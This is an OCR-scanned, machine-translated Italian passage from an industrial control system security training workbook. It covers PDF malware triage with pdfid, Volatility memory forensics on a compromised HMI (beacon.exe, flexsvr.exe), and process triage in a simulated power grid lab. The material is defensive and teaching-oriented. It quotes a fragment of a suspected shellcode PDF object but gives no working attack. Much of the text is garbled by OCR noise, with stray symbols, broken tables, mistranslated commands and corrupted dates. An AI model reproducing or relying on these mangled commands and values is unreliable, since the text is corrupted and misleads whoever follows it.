 84 /U '(\x81¢s! \xa05aecE\x9d61\\n\ x1 FA\x17\x00\ x00\ x00\ x00 \ x90 \ x80\ x00\ x00\ x00\ x00\ xO0\ x00\x00\x00 \x00\x00) 'v2
 86 >>

*Nota* I caratteri non standard in quello che dovrebbe essere un PDF in lingua inglese risaltano immediatamente come strani. Questi, combinati con i valori HEX nell'oggetto che sono molto diversi dal resto del PDF, fanno sembrare che l'Oggetto 388 contenga shellcode, che sarebbe un meccanismo comune nei PDF per eseguire comandi su un sistema e spesso raggiungere domini dannosi per estrarre ulteriore codice dannoso.

*Risposta* Oggetto 388 4. Quante volte sono stati utilizzati /Encrypt e /JavaScript nel Conference PDF? 2 ciascuno
> Analizza le informazioni sulla conferenza_Conferenza IFANS 2010 sugli affari globali (1001).pdf con pdfid.py
> Nel prompt dei comandi, inserisci:
 pdfid.py Conferenza\ Informazioni _2010\ IFANS\ Conferenza\ sugli\Affari\globali\ \(1001\) .pdf

© 2021, Robert M. Lee Lab 4.3-7 pdfid.py Conference\ Information_2010\ IFANS\ Conference\ on\ Global\ Affair (1001\).pdf DFiD 0.2.7 Con ce Information_2010 Conferenza IFAN sugli affari globali (1001) .pdf Intestazione PDF: %PDF-1.6 obj endobj
 flusso finale
 xrif
 trailer startxref
/Pagina

/Crittografa
/Obiettivo

{3 secondi
/JavaScript
/AA
/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia
/Lancio
/File incorporato
/XFA

/URI

{Colori > 2424
 WNNNN
 NPAN
 eh

*Nota* Vediamo che JavaScript e Encrypt sono stati entrambi utilizzati 2 volte ciascuno. È estremamente anomalo avere la crittografia in un PDF che di per sé non è crittografato. JavaScript e crittografia come combinazione, soprattutto nei PDF altrimenti normali, o quelli presenti in operazioni come manuali dei fornitori e guide di formazione, sono un segnale di allarme che dovrebbe essere indagato immediatamente.
 Esercizi da asporto
 L'analisi manuale dei PDF può essere difficile, soprattutto senza una conoscenza approfondita delle strutture PDF, delle differenze nei tipi di versione e degli autori di malware che lavorano per offuscare i loro sforzi. Tuttavia, l'analisi manuale dei PDF tramite strumenti come pdfid e pdf-parser.py può aiutare gli analisti a identificare rapidamente i PDF dall'aspetto strano e quelli che sollevano segnali d'allarme attraverso l'utilizzo di funzioni non comuni o di più funzioni non comuni, come /Encrypt e
/JavaScript. Sono disponibili altri strumenti, come pdfextract che può estrarre file e script in un PDF per visualizzarli, sottoporli ad hashing e analizzarli. Inoltre, vengono continuamente aggiunte nuove funzionalità all'analisi manuale dei PDF. Ad esempio, Didier Stevens ha aggiunto la possibilità di utilizzare file YARA contro PDF in pdf-parser per rilevare comportamenti dannosi. L'importante non è sapere cosa sia ogni strumento o comando, ma capirlo attraverso l'acquisizione del vettore di attacco iniziale (come un PDF), la creazione di un ambiente di lavoro sicuro (come RELI.C.S.) e la ricerca di strumenti di analisi manuale (come pdf-parser), diventa rapidamente possibile familiarizzare con l'aspetto dei file buoni e dannosi e sviluppare una maggiore comprensione degli strumenti disponibili. Questo processo aiuta anche a identificare il motivo per cui alcuni piccoli meccanismi di difesa, come la disabilitazione di JavaScript nei lettori PDF in tutta l'organizzazione, possono contribuire notevolmente alla sicurezza. Questa comprensione può essere condivisa all'interno di un'organizzazione ai fini della formazione degli utenti e per ottenere una migliore adesione alle pratiche di sicurezza.

© 2021, Robert M. Lee Lab 4.3-8

@) io mio) @ ® @)

@ @ Rif,
 eh
 fe
 oh oh

}
 an ap’ aa) Th
 a «a «a «> dn «4p dp op
 UN,
 Lab 4.4 - Analisi forense della memoria HMI _
 e — Acquisire familiarità con la volatilità e Sfruttare tecniche forensi di memoria per estrarre informazioni chiave a supporto della risposta agli incidenti

*Informazioni sullo scenario* A questo punto siamo già a conoscenza del compromesso nella raffineria di Calistoga.Inoltre, abbiamo visto che l’avversario si è spostato lateralmente attraverso l’ambiente dall’IT alle reti OT e probabilmente ha compromesso l’Engineering Workstation (EWS) e l’interfaccia uomo-macchina.
(HMI). In base all'analisi della rete abbiamo riscontrato che i seguenti file venivano spostati sulla rete:

- FTActivationBoost.exe
-RSLinx.exe

- Curriculum vitae.doc

- Flexsvr.exe

-Beacon.exe
 Sappiamo anche che l'EWS è stato utilizzato per interagire con il controllore di sicurezza, probabilmente utilizzando un file di progetto infetto. Tuttavia, non sappiamo se sia stato fatto qualcosa sull'HMI. Sebbene abbiamo visto l'avversario tentare di interagire con esso e comunicare in modo coerente, non sappiamo se i file a cui si fa riferimento sopra o altri siano stati eseguiti correttamente nel sistema. L'immagine della memoria dell'HMI può essere analizzata per identificare se qualcuno dei programmi è stato eseguito e se sono presenti informazioni aggiuntive che possono aiutare con la nostra indagine.

*Nota* Se ricevi un errore con Volatility prova a connettere la tua VM a Internet ed esegui nuovamente il comando; poiché è un artefatto della VM, a volte è necessario un aggiornamento della volatilità
 Questo esercizio utilizzerà il RELI.C.S. VM e il file viewdesigner_memdump .mem nella cartella ics515 > calistogarefinery > memory sul desktop. Dovresti utilizzare Volatilità per completare questo lab.

© 2021, Robert M. Lee Lab 4.4-1 1. Dei file dannosi osservati nel traffico di rete (ad esempio FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe, Beacon.exe e Resume.doc) che, se presenti, sono stati eseguito sul sistema?
 2. Uno dei processi viene utilizzato per consentire all'avversario di apportare modifiche a un altro processo e modificare il software di licenza, quale processo fa ciò?
 3. Quali due processi dannosi ascoltano le comunicazioni di rete?
 4. Quando esattamente è stato eseguito beacon.exe?

© 2021, Robert M. Lee Lab 4.4-2
 qe) fe @@) qe) @) @) oe, noi, oy @, ey
 RF,

‘eB 4s come 1s 4B è’ a8 è’
 COME
 Compito: Familiarizzazione con la memoria di base
 1. Dei file dannosi osservati nel traffico di rete (ad esempio FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe, Beacon.exe e Resume.doc), quali sono stati eventualmente eseguiti sul sistema?
 FTActivationBoost.exe
 Flexsvr.exe
 beacon.exe

> Inizia il tuo RELI.C.S. VM

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Passa alla cartella della memoria della raffineria di Calistoga
> Apri un terminale
> Eseguire il seguente comando nel terminale: cad /home/relics/Desktop/ics515/calistogarefinery/memory/
 ineria/memoria/

> Utilizza Volatilità per identificare i processi in esecuzione sul sistema Windows
> Esegui il seguente comando nel terminale: sudo vol -f viewdesigner _memdump.mem windows.pslist
> Identificare eventuali processi sospetti, in particolare quelli corrispondenti ai file dannosi

© 2021, Robert M. Lee Lab 4.4-3 Fa Falso
 wo P=
 nd Ora ob
 o

_N
 cmd.exe Ox 7 1 conhost.ex ©x85591cd8 cmd.exe 0x
 conhost.exe
 Protocollo di ricercaFiltro di ricercaHo
 FIK Imager.exe
 ANN GG

>1D res
 NNNN O Boe

-2N
 UN
 421
 ND
 EventClientMul
 conhost.exe imgrd.exe
 x86a8a490 ab5d20 Ox86ace030

*Nota* I processi cmd.exe riguardano l'esecuzione della riga di comando e l'interazione con il sistema, non anomalo in tutti i casi ma sicuramente interessante su un sistema potenzialmente compromesso. Questo ci indica lì
 è utile nell'analizzare le informazioni memorizzate nella riga di comando in memoria, ma lo esamineremo tra poco.

*Nota* Esaminando i processi in esecuzione troviamo FTActivationBo (abbreviato da FTActivationBoost.exe), beacon.exe e flexsvr.exe. Vediamo RSLinxNG.exe ma è diverso da RSLinx.exe, quindi potremmo analizzarlo
 certo, ma non lo considererei immediatamente dannoso.
*Risposta* FTActivationboost.exe, Flexsvr.exe e beacon.exe 2. Uno dei processi viene utilizzato per consentire all'avversario di apportare modifiche a un altro processo e modificare il
 software di licenza, quale processo esegue questa operazione? flexsvr.exe

*Nota* In genere è comunque utile verificare se è stato fatto qualcosa sulla riga di comando, ma sappiamo che erano in esecuzione più istanze di cmd.exe, quindi è sicuramente un'ottima scelta. Il plugin cmdline di Volatility eseguirà il pull
 esaurisci la memoria di tutto ciò che è stato fatto di recente tramite la riga di comando e stampalo.

© 2021, Robert M. Lee Lab 4.4-4

®)
 ey, @) cm) qe) qe) qm) qe) q@) qe) ce) (ey) ee) «ey
 om) 45 ‘iB aa ap) “py ap’ <p <p’ <p ip _p

<B
 ap av ap 4p ar 45 4B 4B 4B
 ap

> Utilizza Volatilità per identificare l'output della riga di comando sul sistema Windows
> Esegui il seguente comando nel terminale: sudo vol -f viewdesigner_memdump.mem windows.cmdline
> Identificare qualsiasi attività sospetta
 S$ sudo vol -f viewdesigner_memdump.mem windows.cmdLline Volatility 3 Framework 1.0.1
 Avanzamento: 100.00 Scansione PDB terminata PID Pr
 ss uscito?)
 Helper\U

*Nota* Vediamo il comando RSLingNG.exe ma nulla di veramente evidente. Vediamo anche dove
 FTActivationBoost.exe è stato eseguito ma nessun altro comando. Tuttavia, flexsvr.exe viene eseguito e vediamo che l'avversario lo stava utilizzando per eseguire comandi, in questo caso sembra il dongle e il server della chiave di licenza Rockwell Automation
 sono stati modificati per qualche motivo sconosciuto con un'interazione con Imgrd.exe.

*Nota* In questa fase non arriveremo ad alcuna conclusione completa, ma questo è un altro processo che noi
 potrebbe catturare la memoria o i file eseguibili ad essa associati affinché gli analisti di malware possano dare un'occhiata.

© 2021, Robert M. Lee
 Laboratorio 4.4-—5 3. Quali due processi dannosi ascoltano le comunicazioni di rete? Imgrd.exe
 flexsvr.exe
*Nota* È utile sapere non solo cosa è in esecuzione sul sistema e quali interazioni hanno avuto luogo, ma anche se ci sono potenziali comunicazioni di rete a cui prestare attenzione. Il plug-in netscan di Volatility aiuta a identificare le comunicazioni aperte verso sistemi/processi esterni e locali.

> Utilizzare Volatilità per identificare eventuali comunicazioni di rete interessanti

> Esegui il seguente comando nel terminale: sudo vol -f£ viewdesigner_memdump.mem windows.netscan

> Identificare qualsiasi attività sospetta
 IS sudo vol -f viewdesigner_memdump.mem windows .netscan Volatility 3 Framework 1.0.1 ress: 100.00 Scansione PDB terminata Proto LocalAddr LocalPort ForeignAddr

*Nota* È interessante notare che non vediamo alcuna comunicazione con altri indirizzi IP come i controller di sicurezza con cui sappiamo che l'HMI sta interagendo. Ciò potrebbe indicare che il sistema è stato disconnesso dalla rete prima della creazione del dump della memoria o che ha interagito in altro modo invece di eseguire semplicemente il dump della memoria. Ciò potrebbe comportare un cambiamento del processo per i nostri soccorritori per garantire di preservare il maggior numero di attività forensi
 dati possibili.

*Nota* Mentre esamini le comunicazioni dovresti essere in grado di vedere che Imgrd.exe e flexsvr.exe hanno porte TCP aperte rispettivamente su 27000 e 49170 in ascolto. Questi potrebbero rappresentare le porte a cui l'avversario può connettersi quando desidera interagire con il sistema. Questa è un'ulteriore prova del fatto che questi due processi sono i principali artefatti forensi su questo sistema che dobbiamo segnalare anche ai nostri analisti di malware. Concentrare l'indagine su centinaia di migliaia di artefatti digitali solo su alcuni rappresenta un importante valore aggiunto.

© 2021, Robert M. Lee Lab 4.4-6
 cB) @) ey ®
 Pf. a noi, @, oe, ne, noi, ae
 ce.

; iw
 ww ww ww ww
 w
 su 45 45 45 a5
 a5
 COME
 COME
 4. Quando esattamente è stato eseguito beacon.exe? 2020-09-09 17:36:38 ora locale

*Nota* Il plug-in timeliner di Volatility eseguirà tutti i plug-in in Volatility che dispongono di informazioni sui tempi e li metterà in ordine cronologico. L'ora si basa sull'ora del sistema locale, ma questo è un ottimo modo per conoscere la maggior parte delle azioni intraprese dall'avversario sul sistema e trovare informazioni pertinenti. Inoltre, disporre di informazioni temporali, ad esempio quando sono stati eseguiti eseguibili o comandi, aiuta a concentrare l'indagine non solo sulla memoria ma anche sui log e sul traffico di rete attorno all'incidente complessivo.

> Utilizza Volatilità per identificare la sequenza temporale dell'attività e quando è stato utilizzato beacon.exe
> Esegui il seguente comando nel terminale: sudo vol -f viewdesigner_memdump.mem timeliner.Timeliner > test.txt
> Passare a text.txt (archiviato nella cartella di memoria sotto la cartella della raffineria di Calistoga)
>Apri il file
> Cerca beacon.exe con Ctrl-F
 er_memdump.mem timeliner.Timeliner > test.txt
 170 DLLList Caricamento DLL: processo 4812 svchost.exe caricato CLBCatQ.DLL (C:\Windows\system32\CLBCatQ.DLL)
 171 Caricamento DLL DLULList: processo 1148 svchost.exe caricato SensApi.d1l (C:\Windows\system32\SensApi.dlL)
 172 DLLList Caricamento DLL: processo 1148 svchost.exe Caricato rasadhlp.d1l (C:\Windows\system32\rasadhip.d1ll 173 DLLList Caricamento DLL: processo 2760 explorer.exe Caricato imagehlp.d1l (C:\Windows\system32\imagehlp.dl 174 Processo PsList: 5976 beaconmac (2257938032) 09-09-2020 17:36:38.000000 N/A N/A N/A
 175 Processo PsList: 5976 beacon.exe (2257938032) 2020-69-09 17:36:38.000000 N/A N/A N/A
 176 DLLList Caricamento DLL: processo 896 svchost.exe Caricato pcasvc.dll (c:\windows\system32\pcasvc.d11) Dimensione 177 DLLList Caricamento DLL: processo 896 svchost.exe Caricato AEPIC.d11l (c:\windows\system32\AEPIC .d11L) Dimensioni
 178 DLLList Caricamento DLL: processo 896 svchost.exe Caricato sfc.d1l (c:\windows\system32\sfc.d1l) Dimensione 1228 179 DLLList Caricamento DLL: processo 896 svchost.exe Caricato sfc_os.DLL (c:\windows\system32\ sfc_os.DLL) Siz 180 DLLList DLL Caricato: Processo 896 svchost.exe Caricato VERSION.d1Ll (c:\windows\system32\VERSION.d1L) Si 181 DLLList DLL Caricato: Processo 896 svchost.exe Caricato wevtapi.dll (c:\ windows\system32\wevtapi.dlL) si 182 DLLList DLL caricato: processo 2760 explorer.exe caricato DEVRTL.dll (C:\Windows\system32\DEVRTL.dlL) Si 183 DLLList DLL caricato: processo 5976 beacon.exe caricato kernel32.d1l (C:\Windows\system32\kernel32.d11) 184 DLLList DLL caricato: processo 5976 beacon.exe caricato KERNELBASE.d11 (C:\Windows\system32\KERNELBASE. 185 DLLList DLL caricato: processo 5976 beacon.exe caricato msvcrt.dll (C:\Windows\system32\msvert.d1ll) Dim

*Risposta* Mentre cerchi la prima istanza di beacon.exe scoprirai che è stata eseguita il 09-09-2020 17:36:38 ora locale.L'analisi forense della memoria è una potente capacità di dover esaminare quali azioni sono state intraprese su un sistema, ad esempio quali file erano in esecuzione, le interazioni di rete a livello di sistema e creare sequenze temporali dell'attività degli avversari. Anche l'immagine della memoria in questo scenario, che non era piena di dati forensi, è stata utile per identificare quali file sono stati eseguiti con successo sul sistema, contribuendo a restringere l'ambito dell'indagine e comprendere più a fondo l'incidente e le future raccomandazioni sulla sicurezza.

© 2021, Robert M. Lee Lab 4.4-—7 45 we 8 WwW Ww Ww Ww
 a5

_ Lab 4.5 - Triage dei processi —
 Obiettivi
 e —_ Determina cosa sta succedendo visualizzando i dati di processo e i comandi del sistema di controllo

*Informazioni sullo scenario* C3PO ha ripristinato le proprie operazioni e le procedure di risposta agli incidenti sono in gran parte completate. L'organizzazione torna alle normali operazioni e decide di voler esaminare più da vicino le tendenze del processo rispetto all'attività corrente. L'operatore decide di utilizzare più da vicino Historian e Matrikon per la sua capacità di raccogliere informazioni tramite OPC.
 I sistemi di controllo possono presentare normali problemi di processo a causa di apparecchiature difettose, dispositivi configurati in modo errato o errori umani. Comportamenti anomali del sistema di controllo possono anche essere segnali premonitori di attività avversarie nei sistemi di controllo o di un vero e proprio attacco al processo. Visualizzare queste attività attraverso la prospettiva delle operazioni può portare a una collaborazione e comunicazione anticipata tra i team operativi e di sicurezza durante il rilevamento e il triage di un evento.
 Preparazione agli esercizi
 Questo laboratorio utilizzerà la VM Windows, RELI.C.S. con OpenPLC in esecuzione e il kit PLC
 1. In che modo uno storico è utile quando si esegue un triage di una questione all’interno di un processo?
 2. Come possono apparire alcune attività di minaccia informatica al personale operativo?
 Compito: osservare le normali operazioni
 3. In che modo uno storico è utile quando si esegue un triage di un problema all'interno di un processo? Domanda a risposta a perta

*Nota* Per ottenere gli stessi risultati mostrati in questa cartella di lavoro, assicurarsi che il sistema funzioni con la seguente configurazione.

> Configura il server OPC
> Avviare il server MatrikonOPC per Modbus.
> Selezionare File e quindi importare il file di configurazione da Desktop\ics515\'I.C.S.515_Matrikon_Config.xml.

© 2021, Robert M. Lee Lab 4.5-1
@ importa configurazione
|) > Questo PC > Desktop > File degli studenti - o Cerca file degli studenti
 Organizza ~ Nuova cartella Wi Desktop 9 * Nome “ Data di modifica Tipo
} Download 5 [3) 15515 Matrikon Config 02/07/2021 15:50 File XML
{Bj Documenti n. (2) I.C.S.515_ Matrikon Explorer Config TIS/2021 10:11 File XM
(=) Immagini n. 1) 2021-07-30-1
"aggiuntivo
|| MAllarmi
©) File degli studenti
@® OneDrive GB Questo PC B30 Oggetti
 Nome del file: | iC$515_Matrikon_Config

> Quando richiesto, selezionare NO per esportare per un uso successivo

@® File Modifica Visualizza Finestra Aiuto Q guai = © BH | |B [Seinewniode - HK dete
 MyMatrikonOPC » Locaihost + MatrikonOPC Server per Modbus » Configurazione ServerNodes >

" |Conferma iC
 Stai per sostituire la configurazione attualmente attiva. Vuoi esportarlo per un uso successivo prima di procedere?
 Laboratorio 4.5-2

© 2021, Robert M. Lee

=) = 2.
 e
 PS | eee | ee |Vedi ee |e eS le tariffa | nemico |
 eo
 ee®®

® ®@ ®
 BR®
 oe B
 ki

?

(ae ff wo wa © w©w wD WwW Ww WwW WwW W
 Davvero, OY
 A
 a, come '4B' <BR'
 ap
 iy Server MatrikonOPC per Modbus - [Localhost\MatrikonOPC Server per Modbus\ServerConfigControl]

®, Guida della finestra di modifica della visualizzazione dei file
 i €]) Indietro ~ () ~ St *y | (2) Spe Nuovo nodo > © Elimina posizione: MyMatrikonOPC » Localhost » MatrikonOPCServerforModbus » Configurazione ServerNodes » a-@ MyMatrikonOPC a '3 Localhost
= Server Zt MatrikonOPC per Modbus

& Configurazione dei nodi B erver
 IB Clickplc IB Openpic Configurazione automatica!
 i (8) Opzioni avanzate

> Per evitare lacune nei trend, avviare Matrikon OPC Explorer dal menu Start i. In alternativa: accedere a C:\Programmi
(x86)\Matrikon\OPC\Explorer\OPCExplorer.exe
> Eseguire MatrikonOPC Explorer

*Nota* Matrikon OPC Explorer è un pacchetto client OPC generalmente utilizzato per la risoluzione dei problemi.

> Seleziona File e apri la configurazione I.C.S.515_Matrikon_Explorer_Config.xml
 Elemento gruppo file server Visualizza la Guida
 Rt Sole @ ha Plo Bw e
 Host locale '\\SANSI.C.S.-WIN'
 ve v iy Localhost '\\SANSI.C.S.-WIN'
'SRE Matrikon.OPC.Modbus. 1 GE Matrikon. OPC. Simulazione. 1

'DI RSLinx OPC Server
 Server OPC remoto biG RSLinx
 Risorse di rete Altri computer di rete

@ Sessione aperta

- ~ p > QuestoPC » Desktop > File degli studenti
 Organizza + Nuova cartella

*~ Nome
 sk Accesso rapido Desktop # 4} Download #

(| 1CS515_Matrikon_Config
() 1CS515_Matrikon_Explorer_Config

> Verifica che gli elementi visualizzati abbiano valori e che la colonna "Stato" mostri Attivo.

© 2021, Robert M. Lee Lab 4.5-3
>

.-—— saccms=s | ID elemento Valore AccessPath Qualità Timestamp Stato
{8 Clickplc.... Vero bene, non... 16/07/202... Attivo
{1 Clickplc.... Vero bene, non... 16/07/202... Attivo
(i Clickplc.... True Good, non... 16/07/202.... Attivo ft} Clickplc.... True Good,non... 16/07/202... Attivo
(> Clickplc.... Vero bene, non... O7/16/202...Attivo
(> Clickplc.... 120 Buono,non... 16/07/202... Attivo G2} Clickplc.... 80 Buono,non... 16/07/202... Attivo
> Clickplc.... 80 Buono, non... 16/07/202... Attivo i Openpic... 30 Buono, non... 16/07/202... Attivo
 tl {%} Openplc... 30 Buono, non... 16/07/202... Attivo
 Imposta l'alimentazione residenziale.

> Nell'HMI, aprire la schermata "Residenziale".
> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme.

> "Chiudere" la richiusura.

*Nota* Un quadrato ROSSO indica chiuso indipendentemente dai colori della linea
 Principale

>
 Trasmissione
 Generazione |g Distribuzione
 Residenziale
 Industriale
 Strada della Casa sul Lago
 Allarmi
 Richiusura
 Domanda attuale
 Imposta la potenza industriale
> Apri la schermata "Industriale".
> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme
> "Chiudere" l'interruttore
> Assicurati che entrambe le raffinerie siano spente

© 2021, Robert M. Lee
 Strada del Lago Piacevole
 Aperto chiuso
 Carico massimo
 15/07/2021
 Accesso alle tendenze 14:36:39
 Lab4.5-4
 MW
 Mw

@

? Zp
 ty
 a5 <5 <5 <5 <5
 COME
 ap
 Trasmissione
e distribuzione
 Generazione residenziale industriale
 7130/2021
 Tendenze 20:40:31
 Prelievo MW della raffineria
 Uscita corrente
 Max Mi

> Configurazione dei sistemi di trasmissione e distribuzione

>
 Apri la schermata "Trasmissione e distribuzione".

> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme

>
 Generazione 280 MW
 Consumo di MW
 10%
 Chiudi la generazione di intertie
 Generazione residenziale industriale
 Trasmissione e distribuzione
 JL
 Lamda Power House AUTOBUS DI TRASFERIMENTO
 Trasmissione Lambda
 Relè di protezione e
& _
 Sottostazione Lamda
 Tendenze del 15/07/2021 15:13
| Generazione interticolare
 forno |
 Guasto | |

© 2021, Robert M. Lee
 Lamda Chee | Interruttore di trasmissione /

| Consumo di MW
 MW

> Configurare il sistema di generazione
> Aprire la schermata "Generazione".

> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme
> Impostare i "Comandi valvola carburante CT" su "Modalità automatica" e "OpenPLC"
> "Avviare" la turbina a combustione e attivare "AVR On"
> Chiudere l'interruttore di generazione
‘Ganeration ee Residential industrial Login sti iaheth CT Comandi valvola carburante Generazione Interblocco Stato water er
@ Modalità automatica | Permessi dell'interruttore
, © Locale Fare clic su PLC @ Generatore in funzione al 30 % Aperto @ OpenPLe @ Trans. Interruttore chiuso, ovvero @ Trans. Relè di protezione oes Modalità Warsi @ Carico presente Controllo Setpoint di controllo ClickPLC |» Manuale | 80 || % Aprire
 Turbina a vapore
 Aria in ingresso
 Turbina a combustione

@CTRunning @ AVR Acceso = mia Potenza Potenza Potenza Modalità Esperto ©/CT Arrestato © Modalità Manuale Acceso Generazione di consumi Disponibile su Usa PB | _votage Manuale Industriale 30 MW Locale 80 MW Locale | 280 OF = Reo Stat Residenziale 50) MW Intertie 0 MW Intertie [500 su Tota [80 | mw Totale [80 | mw Totale [70

> Revisione dell'andamento del funzionamento stabile
> Aprire la schermata "Trend" > "Generazione".

*Nota* Dovrebbe essere simile al seguente ma potrebbe non essere identico
 Open PLC è attivo e funzionante nella VM.

© 2021, Robert M. Lee Lab 4.5-6
 MW MW MW
 ohm

@ce,
 eh
“5 te 45 as 45 as Ae wy aw
 43
 a5

>
 Residenziale Industriale
 Togliere l'elettricità residenziale.
 azione Relè
 CT in esecuzione
 Uscita (MW) IB Temp. Aria Niet (F) BB Setpoint (Mw)
 TB ha mangiato il valore impostato BBE @%

> Dalla scheda del kit studentesco ruotare il quadrante del carico residenziale fino in fondo e poi fino in fondo
 su

> Dovrebbe esserci un chiaro calo di “Produzione (MW) e “Posizione valvola (%)” e un relativo calo
 aumentare in concomitanza con l'aumento del carico

© 2021, Robert M. Lee
 Laboratorio 4.5-7
> Esaminare i valori di generazione

> Aprire la schermata "Generazione" e annotare le modifiche alla posizione e all'uscita della valvola, ma in caso contrario
 tutto è come prima.

*Nota* Questi sistemi sono costruiti per eseguire molte funzioni operative ma abbiamo appena assistito al corretto funzionamento di una delle relazioni funzionali tra il sistema fisico (valvola di controllo del carburante e combustione
 15/07/2024
 Interruttore del generatore
 Trasmissione Bre

= Relè di protezione
 CT in esecuzione
 AVR attivato
 Potenza (MW) Temperatura aria in ingresso (F)
 Punto di riferimento (MW)
 Posizione della valvola (%)
 Punto di riferimento (%)
 turbina) nonché il sistema di controllo (interoperabilità di PLC, HMI e OPC).

*Risposta 1* Uno storico, registra l'attività passata del comportamento, dei permissivi e degli stati del sistema fisico. Ciò consente alle operazioni di confrontare il comportamento attuale del processo con il comportamento storico. È tipico di uno storico
 da configurare solo per monitorare i punti dati chiave e critici del sistema, ma solitamente non tutti i punti dati.

© 2021, Robert M. Lee
 Laboratorio 4.5-8

<-a

°o

=
 fe
 o
 fe
 fe

>

=
 bd

>

>

>

>

>

>
 a wa Ww WwW
 noi Ww
 wow, noi, Ww
 45 ae «4 w G noi ww Ww G w ww
 45
 Compito: identificare i problemi del processo

> Con tutto funzionante come prima, “Esportare” i Tag dal server OPC
> Aprire la schermata Tendenza generazione
> Eseguire l'applicazione di esportazione dei tag OPC
 Una nota
 UN
 è l'esportatore di tag OPC

> Attendi circa un minuto e fai clic su "OK" per cancellare la finestra del messaggio di errore
 Esportatore OPC
 Errore programma {codice: 0443243)

*Nota* Un errore come questo potrebbe far riflettere un professionista della sicurezza, ma questi tipi di errori possono verificarsi continuamente e non avvisano la maggior parte degli operatori di qualsiasi cosa anomala.

> Togliere l'elettricità residenziale

> Regolare il carico residenziale manipolando i quadranti su e giù e osservare nuovamente l'effetto

> Dal kit studente, premere il pulsante di richiusura residenziale Apri PB, quindi attivare l'interruttore sim 6 per cancellare l'allarme e quindi premere il pulsante di richiusura Chiudi PB.

> Osservando l'andamento della generazione in risposta alla perdita di carico rispetto alla risposta all'operazione di richiusura si nota una notevole differenza nel comportamento degli andamenti ora rispetto a prima rispetto all'"Uscita"
(MW) e "Posizione valvola (%)". Inoltre, se accedi alla schermata di generazione vedrai che anche l'AVR è disattivato

© 2021, Robert M. Lee Lab 4.5-9 15/07/2021 13:00

<a
 Interruttore del generatore
 Interruttore di trasmissione

| Relè di protezione

> Tentare di risolvere il problema
> Aprire la schermata "Generazione".
> Fare clic sul pulsante AVR per riattivare l'AVR

@ CT in esecuzione CG AVR attivato
 Sim in modalità esperto 8
 On = Usa Inizio | di PB Voltaggio
 Spento=Stati auto —| Regolamento
 CT in esecuzione AVR acceso
 Uscita (MW) Temp. aria in ingresso (F) Setpoint (MVV)
 Posizione della valvola (%)
 Punto di riferimento (%)
 CCT interrotto © Modalità manuale attivata
 Setpoint modalità manuale
 280

(ehi
 ef @
 eh

@

*Nota* Dal punto di vista dell'operatore e degli ingegneri, questo non ha senso. La funzione per abilitare la modalità manuale, in generale, viene eseguita da un essere umano, non dalla logica del controller. L'uso della modalità manuale non è solitamente un'attività regolare, quindi il team operativo può riflettere su diverse possibilità, come ad esempio:

© 2021, Robert M. Lee Lab 4.5-10 ww
 a5 45 a asey w a
 45
 45 45 a
 COME
 e Il controller risponde correttamente?
 e Sono state apportate modifiche al sistema? e La comunicazione funziona correttamente?
 e È effettivamente in modalità manuale?
 e Qual è la causa principale di questo problema?

> Mentre un team sta indagando sul problema dell'AVR, è tempo di riapplicare l'elettricità residenziale
> Ritornare alla schermata "Residenziale".
> "Reimposta allarme"
> "Chiudere" la richiusura
 Resetta gli allarmi
 Domanda attuale 0 MW
 Richiusura
 Strada della Casa sul Lago
 io
 Aperto chiuso
 Carico massimo 100 MW
 Lago Piacevole R

> Torna all'AVR

> Ritornare alla schermata "Generazione".

> Tentare di riaccendere l'AVR. A seconda dello stato del pulsante potrebbe essere necessario eseguire un paio di clic
 io. Alla fine il pulsante "Regolazione della tensione" dovrebbe leggere "Manuale" e la spia "AVR On" dovrebbe essere verde fissa

> Ripetere la procedura per vedere se c'è una coincidenza tra l'apertura della chiusura residenziale
 e il sistema AVR.

*Nota* In un sistema I.C.S. possono verificarsi delle coincidenze. ma alla fine le operazioni rimarrebbero normalmente irrisolte quando i problemi si risolvono magicamente senza una spiegazione chiara e dimostrabile. In alcuni sistemi, o in cui il sistema operativo si trova in uno stato particolare (ad esempio spento), il team operativo potrebbe essere in grado di manipolare il sistema per esplorare più a fondo questi problemi e coincidenze. Molte volte, tuttavia, questo lusso non esiste poiché manipolare il sistema può essere indesiderabile e avere un impatto negativo sull’azienda. Non in tutti i casi, ma in questo esempio non si sono verificati errori operativi o bug tipici che spiegassero cosa è successo. Dal punto di vista delle operazioni fisiche, il risultato dello spegnimento dell'AVR creerebbe tuttavia una condizione operativa manuale per l'operatore di generazione che richiederebbe comunicazioni di controllo del set point con l'operatore di trasmissione o l'autorità di bilanciamento fino alla risoluzione del problema. L'indisponibilità prolungata può influire sul processo decisionale operativo in merito agli impegni unitari e alle offerte sul mercato.

*Risposta 2* Le attività di minaccia informatica possono sembrare subdole, ma gli impatti fisici e aziendali associati a tali sottotitoli possono avere impatti più devastanti. In qualità di difensori, ci affidiamo ai nostri team operativi come occhi e orecchie per le prime indicazioni di eventi informatici, con la consapevolezza di come la visione di questi sistemi potrebbe essere fondamentale per comprendere le intenzioni di una minaccia.

© 2021, Robert M. Lee Lab 4.5-11 Attività: pulizia

> Esaminando i processi in esecuzione all'interno della VM Windows, identifichi opctagexporter in esecuzione e puoi interrompere il processo
 er Opctagexporter 0% 9,7 MB 0 MB/s 0 Mbp:

\4s opctagexporter 0% 0,8 MB 0 MB/s 0 Mbp:

*Nota* Con il processo interrotto, non si noterà più il comportamento strano derivante da una richiusura della distribuzione che incide sullo stato dell'AVR in un generatore.
 Esercizi da asporto
 In alcuni casi, la registrazione e le analisi forensi disponibili su un particolare sistema I.C.S. il dispositivo potrebbe essere limitato e non essere utile per la risoluzione dei problemi relativi agli eventi operativi.Sfruttare l'attività operativa della rete, i dati storici, i dati sugli allarmi, la sequenza dei dati degli eventi, l'analisi dei processi degli endpoint e le revisioni dei registri host possono essere utili per determinare eventi di sistema anomali che spesso sono semplicemente operazioni errate dichiarate senza che venga eseguita un'analisi completa per identificare il problema. vera causa.

© 2021, Robert M. Lee Lab 4.5- 12

(Way
 eo®)
 om om wo do wb OY WY wo wD &
 noi Ww
 J
 B ap ap »

«ps
 45)
 Lab 5.1 -Analisi logica per l'analisi delle cause profonde _
